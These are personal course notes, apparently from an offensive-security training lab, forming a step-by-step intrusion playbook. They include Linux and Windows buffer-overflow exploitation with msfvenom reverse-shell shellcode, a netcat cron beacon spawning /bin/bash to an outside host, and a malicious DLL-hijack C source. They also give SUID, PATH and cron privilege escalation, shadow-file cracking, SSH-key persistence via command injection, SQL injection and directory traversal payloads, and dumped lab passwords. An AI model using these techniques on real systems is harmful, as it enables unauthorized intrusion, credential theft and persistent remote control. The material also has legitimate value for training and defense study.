file:///home/frederick.t.bradley90/Downloads/x86_guide.pdf


What is %RIP and %EIP main purpose?

 %RIP/%EIP are the 64 bit and 32 bit instruction pointers that hold the memory address to the next instruction




Day 5

Commands for binary analysis

file - 
strings -n <filename>
strings -n 10 demo.exe | less

Artifacts:
Enter key:
123 is 123.
%s is not 123.

GDB = GNU Debugger
Peda = GDB Plugin

gdb demo.exe

GDB commands:
disass main

GDB-Peda commands:


Behavior analysis

Dynamic Analysis
-Sysinternals Tools: procmon, procexp
Disassembler and Decompiler
Documentation




Day 7

If gdb is on the box. will be doing
disass <FUNCTION>   -   Disassemble portion of the program
info <...>  -   Supply info for specific stack areas
x/256c $<REGISTER>  -   Read characters from specific register
break <address>  -   Establish a break point
(BIG) P to specify port in scp
Enter a String:
if it’s taking input but doesn’t ask for a parameter…
Linux BUFFER OVERFLOW
in gdb-peda$
how to disassemble - 
pdisass main (looking for red) ignore x86.get…
pdisass getuserinput - looking for red (red means vulnerable)

get function vulnerable
Enter a string: (enter a bunch of characters)
Segmentation fault (core dumped) - means it’s vulnerable to buffer overflow
GO to wiremask.eu - to find exact buffer overflow count
Go to Tools -> buffer overflow pattern
paste default string into program.


Creating exploit
run <<< (python buff.py) - if it asks for parameters and not input. do NOT use “<<<”
EIP should have <hex value> (‘BBBB’)
if gdb is on a target box (DO buffer overflow)
env - gdb <executable> - open regular gdb (on target box. not your box)
show env - show environmental variables in base gdb
unset - get rid of environmental variables in base gdb
unset env LINES (case sensitive variable)
unset env COLUMNS(case sensitive variable)
show env - make sure there are no environmental variables left
run program (run) - overflow it
info proc map - gets a process map to get memory address for stack and heap.
find /b <1st_heap_value>, <last_heap_value>, 0xff, 0xe4
if an error occurs grab value above last_heap_value
grab extra from output in case 1 doesn’t work
paste into script
take memory address and reverse byte order 
ex: 0xf7f664eb
eip = ‘\x86\x64\xf6\xf7’
nop ‘\x90’ * 10 - nop sled safety to ensure the script reads only what i want it to.

Running exploit
msfvenom -p windows/shell_reverse_tcp lhost=10.50.20.205 lport=5555 - b '\x00' -f python
output: buf =  b""
buf += b"\xda\xde\xb8\x03\x0e\xec\x7d\xd9\x74\x24\xf4\x5a\x29"
buf += b"\xc9\xb1\x0b\x31\x42\x19\x03\x42\x19\x83\xc2\x04\xe1"
buf += b"\xfb\x86\x76\xbd\x9a\x05\xef\x55\xb0\xca\x66\x42\xa2"
buf += b"\x23\x0a\xe4\x33\x54\xc3\x96\x5a\xca\x92\xb5\xcf\xfa"
buf += b"\xa2\x39\xf0\xfa\xdb\x51\x9f\x9b\x4e\xc8\x5f\x0b\xc2"
buf += b"\x83\x81\x7e\x64"
looks something like this. paste it into script after nop.
for each command run. must generate new shell code.
./<program> <<< $(python buff.py)
scp vulnerable binary back to your box. run steps make sure it works. Copy paste script in vim on target machine.
Can put your script in /tmp - a world writable directory



Post Exploitation
Linux Security Products
kaspersky 
rkhunter
rsyslog.conf
crontabs
################

ip neigh, arp -a, or ipconfig -a, ip addr, ipconfig /all
| tee - print to the screen the output of pipe
cyberchef Encoding methods
base64 - base64 if there is an “=” sign on the end of the string
rot13

w - who’s logged on and what they’re doing
who - who’s logged on
whoami - current user logged on
zeus - is a root user (HAS ROOT PRIVILEGES, IF IN /ETC/SHADOW GO AFTER IT)
ls -la - look for HIDDEN DIRECTORIES ON SYSTEM
/etc/hosts - contains the Internet Protocol (IP) host names and addresses for the local host and other hosts in the Internet network

net user <username> /add
look for remotedesktop users
if you log in as system you want to create an account and add yourself  the administrator group.StudentMidwayPassword
sudo 
sudo find / -maxdepth 10 -type f \( -name "*.conf" -o -name "*.txt" -o -name "*hosts" -o -name "networks" -o -name "shadow" -o -name "passwd" -o -name "cron*" \) -exec cat {} \; 2> /dev/null  | egrep -i 'f1@g|f1ag|fl@G'
sudo -l - see what commands can be run with sudo

on intranet - sudo cat /root/brootkit/brootkit-master/README.md

Linux privilege escalation
-Priv esc is only after you have initial access
-If you can’t priv esc, check other users. If that doesn’t work, you probably can’t priv esc on that box.
-Use your own box to test priv esc
-If you can sudo a non_standard binary. (func, don’t_exploit_me) look into it.
-sudo cat /etc/sudoers
- sudo cat /etc/sudoers.d/90-cloud-init-users
-If you can sudo cat, you can crack passwords
Sudo priv esc
sudo -l
Find everything with suid bit set - find / -perm /4000 2> /dev/null
Find everything with sgid bit set - find / -type f -perm /2000 2? /dev/null
go to GTFObins 
EX: suid the “at” command
 echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null - switch /bin/sh to /bin/bash

path variable Priv Esc
-Look for cronjobs cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls being run by root
-user touch command to see if you can write somewhere, if you can’t write there you can’t do anything with it
-echo $PATH. If there is a “.” dot in front of a path variable that means it’s going to check the current working directory for a command first. Which you can replace with your own script called that command.
-Intel says this user has a dot in their path variable. He is known to run commands out of ____ variable
switch to that user
change $path variable location - echo “.:”$PATH > $PATH
vim <command_script>
chmod +x <command_script>
run commands. Modify script to run other commands as needed
Cron Priv Esc
-Sudo crontab -l - look for scheduled jobs for root
-tree /etc/cron* or ls /etc/cron*
-look for a non_standard crontjob for root. 
-If you find a file. cat it and look at it.
-If it’s long and doesn’t have a flag at the top or bottom. Don’t worry about it.
-Crontab.Guru

World writable folders
-/tmp - if there is a script in vim it can be modified
Vulnerable software and services 
-sudo -l
-
###
Get kernel version - uname -a
Linux lin-ops 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
kernel version 4.15
Logs to look for - syslog, rsyslog,systemd


vim ls
Go to computer with user of interest in home directory -
Don’t have sudo permissions (sudo -l doesn’t work)
no gdb installed
 .: steps
cd /home -> ls 
cd /tmp
create script ‘vim ls’ -> chmod +x
/bin/ls /home/<user> > /tmp/fuck_this
wait for file in /tmp
replace script text with commands you want to run
commands to place in script
-sudo -l see what <user> can run with sudo permissions
-/bin/cat - must put full path to command to use in script
cat /etc/shadow scp back to box and use john the ripper to get root’s password
scp back wordlist found to use for john
john - - wordlist=<wordlist> file created
./unknown /etc/sudoers 'comrade ALL=(ALL:ALL) ALL'

zeus lin2 passwd - 

beacon - * * * * * nc 192.168.28.135 33403 -e /bin/bash


Windows Privilege Escalation
Windows Access Control Model
Access Tokens - Users
-Roles
-Permissions
-Rights

Security Descriptors - Files
-DACL: Discretionary Access Control List
Rules on the file
-SACL: System Access Control List
Auditing on the file
-ACES: Access Controls Entries
Entries of what to audit on the file
inside of the SACL
Windows Priv Esc types
Scheduled Tasks (like cron)
-Binary Replacement
Services
-Binary Replacement
-DLL Hijacking
Binary Replacement: Replacing the legitimate binary with a malicious binary with a malicious binary
DLL Hijacking: Replacing the legitimate DLL that the binary is calling out to with a malicious DLL
C:\Windows
C:\Windows\System32
Determine if UAC is turned on or off - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
File Manifest
Requested Execution Level:
UAC looks at requested execution level to determine to run - asInvoker, highestAvailable, or asAdministrator
AutoElevate: Allows you to determine if a program will automatically elevate to the highest privilege level available for a program. True or N/A
Cmd
AsInvoker
autoelavate: N\A

check logs
Highest available
AutoElavate
net use * \\live.sysinternals.com\tools
input: sigcheck.exe -m C:\Windows\System32\eventvwr.exe | findstr /i level
output: <requestedExecutionLevel
              level="highestAvailable"

input: sigcheck.exe -m C:\Windows\System32\eventvwr.exe | findstr /i level
output: <autoElevate>true</autoElevate>

create a scheduled task: schtasks /create /TN Putty /TR “C:\Putty\Putty.exe” /RU SYSTEM /SC onlogon

TaskScheduler
Determine Conditions
General Tab -> Security Options: SYSTEM
Trigger Tab -> Trigger: At Log On
            Status: Enabled
Actions Tab -> Action: C:\Putty\Putty.exe
Determine if we can write to location
-Attempt to create file inside directory
Perform Actions
-Binary Replacement
Replace legit binary with malicious binary
Ensure malicious binary has same name as the “Actions” Tab is calling for
http://10.50.35.61/uploads
File Explorer -> View -> 
[x] File Name Extensions
[x] Hidden Items
4) Reboot / Log on / Log back in
shutdown /r /f /t 00 
-DLL Hijacking
Services (Binary Replacement)
Determine the Conditions
-Log on As: Local System
-Start up Type: Automatic
-Description: Blank (Third_Party Service)
Third_Party software may be installed in non_standard directory
C:\Windows
C:\Windows\System32
Right Click -> Properties
Path to Executable: 

Determine Vulnerable Directory (If we have write permissions)
Perform Actions
Reboot

DLL Hijacking
procmon.exe -accepteula
find what .dll it’s calling on
Filters
process name - contains - putty - Include
result - contains - NOT - Include
Path - Contains - .dll - Include
https://www.chiark.greenend.org.uk/~sgtatham/putty/wishlist/vuln-indirect-dll-hijack-2.html
b. Create C source File and Compile DLL
Install Packages on lin_ops: 
sudo apt-get install mingw-w64 mingw-w64-common mingw-w64-tools mingw-w64-x86-64-dev -y

########## SSPICLI.c ########## 


Ways we can Escalate our privileges
-Create user, added that user to both RDP users and Administrator
-Add existing users to privilege groups
Considerations:
\ = To escape characters
#COmpile the raw C source code into a unlinked c object
i686-w64-mingw32-g++ -shared -o SSPICLI.dll SSPICLI.o
#include <windows.h>
int execCommand()
{
 WinExec("cmd /C whoami > FINDME_1.txt", 1);
 return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 execCommand();
 return 0;
}
  Create Script       ########## SSPICLI.c ##########
command - i686-w64-mingw32-g++ -c SSPICLI.c -o SSPICLI.o
command - i686-w64-mingw32-g++ -shared -o SSPICLI.dll SSPICLI.o -Wl,--out-implib,SSPICLI.a
ls SSPICLI.*
check for  “SSPICLI.a”, “SSPICLI.c”, “SSPICLI.dll”, “SSPICLI.o” 
Transfer file to target location (scp)
reboot

Windows Registry Keys
Non_volatile keys - HKLM, HKU
HKLM -> HKCC -> Run/RunOnce -
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run or runonce
 where to look for persistence
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\`` run or runonce
HKU -> HKCU -> Run/RunOnce -

Windows Event Viewer
right pane “Actions” -> “Filter Current Log”
                -> “save Filter Log File A”
Enumerate logs through CMD
wevtutil qe Security /?
auditpol /get category:* - look at what things are being logged for success and failure events
must have admin privileges for both of these
Enumerate logs through powershell
get-eventlog Security | ft -wrap

What is a command shell?
command line - Does not create logs
wmic -  creates Logs

What is a scripting shell?
Powershell - creates Logs
reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell

Service causing error level log in current user’s directory - go to C:/users/<user>/<log>
filter current log -> [x] error -> ok -> general -> source: service control -> general box: name of service
date log was created - “Date and time”
Log system time change - 

services - no description, running, local system
go to location of executable
find dll - hijackmeplz.dll
go back to lin ops - edit 
make new dir
add to dir
compile 
python3 -m http.live
ssh keygen steps
SSH Keygen alongside WebShell or Command Injection    ~Gaining Access~
~ Using the WebShell script from above we can allow ourselves to login to the machine using ssh keys
On our machine:
~ Create the .ssh directory in the user home folder if it is not already present, run the below in this directory.
ssh-keygen -t rsa    ~ creates private and public SSH keys for our box, just spam enter
ssh-keygen -t rsa -b 4096    ~ optional alternative
    ~ Copy the key from the ida_rsa.pub file, as we want to use the PUBLIC key! We're going to need this later.
On target webserver:
~ Using Webshell/Command-Injection create the '/var/www/.ssh' directory and create a file called 'authorized_keys'.
    ~ After doing the above, we will need to add our public key to this file!
Command Injection Method:
; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCfxJV4VlPSjVkksSRuBhqzORLIbp6sYcBVMdkgMUYOBAssEniJ/YwsRAgNx77WYDZwf2QH/o/mkiPMZjwcO3Eapwe61oC0jJOUjMSBmHtfQrPV/ONmFNt2hGvUYAOLFakcKdy6QEX0g+MeTeoFhfNIxr9K6S+kPIpPOA7qXn/HdL7JD/XmQSvnW+PLm2HPcXQRwC1O1FRHw+DuZPKs/LLz1/ZFUGDee/1QVLjCq2uwnpU2xZBs38lMaRoBhUGweLArgr60+vAgHYp8dW3aHYlL4T3VRBR96SpXqvx1vMvWfCGOyoIg+20Ov2Aa1b8hbJ2Yd0n4vyLOQlHnreUktXcD student@linux-opstation-k5s8" >> /var/www/.ssh/authorized_keys
Webshell Method:
echo “<key>” >> /var/www/ .ssh/authorized_keys
~ After doing this, we can attempt to connect to the machine using SSH as the default user of the webserver
    ~ Do 'whoami', typically it's 'www-data' as the user



Dry Run script
nmap -Pn -T4 --min-rate 80000 10.50.34.185 -p-
nmap --script http-enum.nse <ip_addr> -> /scripts -> development.py, nikto -h
click on development.py
credentials user2 <password>
ssh user2@<ip_addr> SWITCH TO BASH SHELL
Employees sign in 
aaron’ or 1=’1 pw: aaron’ or 1=’1 
credentials for user2, user3, lee_roth work on dumping this database
job openings tab directory traversal ../../../../../etc/passwd /etc/group /etc/hosts -> 192.168.28.181
login page. Network tab -> request -> raw -> copy …php?username=bob' OR 1='1;&passwd=bob' OR 1='1;
rot13 user2 pw: EaglesIsARE78
 cd /var/www/html - cat files for information
ssh user2@10.50.34.185 -D 9050 -NT
proxychains nmap -T5 -Pn <192.168.28.181> -p 22,80 closed
ping sweep: for i in {1..254}; do (ping -c 1 192.168.28.$i 2>&1 | grep "bytes from" &); done
ssh user2@10.50.35.185 -L 10701:192.168.28.181:80 -NT
firefox localhost:10701
click submit
localhost:10701/pick.php?product=1…..8 is the limit
localhost:10701/pick.php?product=7 or 1=1;
http://localhost:10701/pick.php?product=7 union select 1,2,3
order 1,3,2
localhost:10701/pick.php?product=7 union select table_schema,column_name,table_name from information_schema.columns
localhost:10701/pick.php?product=7 union select id,name,account from siteusers.customer


Item
On Hand
Price
HAM
32
$15
1
123558
$Lockheed Martin
2
14744
$Boeing
3
117
$General Dynamics
4
33699
$Northrop Grumman
5
55487
$ManTech International


20) localhost:10701/pick.php?product=7 union select user_id,name,username from siteusers.users


id
password
username
HAM
32
$15
1
Aaron
$Aaron
2
user2
$user2
3
user3
$user3
4
Lroth
$Lee_Roth
1
ncnffjbeqlCn$$jbeq
$Aaron
2
RntyrfVfNER78
$user2
3
Obo4GURRnccyrf
$user3
4
anotherpassword4THEages
$Lroth

rot13 decode passwords 
user3: Bob4THEEapples 192.168.28.172
Aaron: apasswordyPa$$word
user2: EaglesIsARE78
LRoth: anotherpassword4THEages
ping sweep on 10.50.34.185
64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=2.51 ms
64 bytes from 192.168.28.181: icmp_seq=1 ttl=63 time=2.00 ms
64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.682 ms
192.168.28.172 ports: 22 SWITCH TO BASH SHELL
27 sudo -l -> gtfobins -> find command -> become root
xfreerdp /u:Lroth /p:anotherpassword4THEages /v:localhost:10703 /size:1900x1000 +glyph-cache +clipboard

WIndows Buffer Overflow Steps
Check Services - SecureServer there - means perform buffer overflow
 windows buffer overflow steps (if windows box scan for port 9999)
create a tunnel from lin ops to port 9999 on windows machine
on lin ops edit script line “s.connect” change address to ((“localhost”, <tunnel_port_from previous_step>))
open msfconsole
use multi/handler
set payload windows/shell/reverse_tcp
set lport 5555
set lhost 0.0.0.0
show options, check parameters
run
msfvenom -p windows/shell/reverse_tcp lhost=10.50.20.205 lport=5555 -b '\x00' -f python
copy/paste shellcode into win_buff.py script
on lin_ops: python win_buff.py
gained admin access. If you find putty on box. try to place dll there.
if you can rename an executable it is for binary replacement
General Notes
-Question names line up with box names.
-Go over cron jobs priv esc
-Go over reverse engineering
-find ‘func’
-Go over .dll hijacking and binary replacement
-Go over linux .path variable priv esc.
-Go over linux buffer overflow how to scp buff.py script over to target box
-Go over important locations on linux and windows to check
vulnerable to post method "posting to a field"
 -get method - getting it from the website. a request
-Practice on gdb func - linux buffer overflow

-Take Opnotes. Record flags and locations. Make a map
-Don’t waste time. DON’T GIVE UP!
-Review Sergeant Wilson’s notes.




intranet - /usr/share /etc/hosts

Questions
-research on “fgets” or other information found from doing pdisass on buffer overflow
-best locations to check for other boxes /etc/hosts etc.
-linux priv esc methodology 
-Go over ssh keygen steps


 






























































































































































